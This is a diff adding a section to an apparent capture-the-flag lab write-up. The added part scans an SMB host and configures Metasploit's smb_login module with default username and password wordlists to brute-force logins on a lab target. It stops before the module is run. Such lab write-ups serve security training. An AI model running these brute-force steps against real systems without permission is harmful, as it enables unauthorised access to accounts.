@@ -65,3 +65,32 @@ Since we need to go to the C: direcotry, type `dir C:\`
 And the flag2.txt is visible, then `type C:\flag2.txt`
 and you'll obtain the flag 2
 
+For the 3rd flag, we get the propmt: SMB shares might contain hidden files. Check the available shares. (target2.ine.local). As this is a different host, we will perform a nmap scan first to detect the running services 
+
+<img width="1808" height="846" alt="Screenshot 2026-01-26 at 10 46 22 PM" src="https://github.com/user-attachments/assets/6088eee4-4907-4559-9b75-96153c83cf95" />
+
+There's is something runnng on port 445, SMB uses port 445. Alo we can seethe message: signing enabled but not required that means can be accesible through PsExec. Since PsExec can be automated through MSF, we will iniitate the service and look for the following module: smb_login 
+
+```
+┌──(root㉿INE)-[~]
+└─# service postgresql start && msfconsole
+```
+after loking the module, we will look for the options of the module and configure them
+
+<img width="1840" height="935" alt="Screenshot 2026-01-26 at 10 55 04 PM" src="https://github.com/user-attachments/assets/518043cf-ab2d-48a7-b96b-103eaa0b1fb6" />
+
+```
+msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS target2.ine.local
+RHOSTS => target2.ine.local
+msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+
+
+
+
+
+
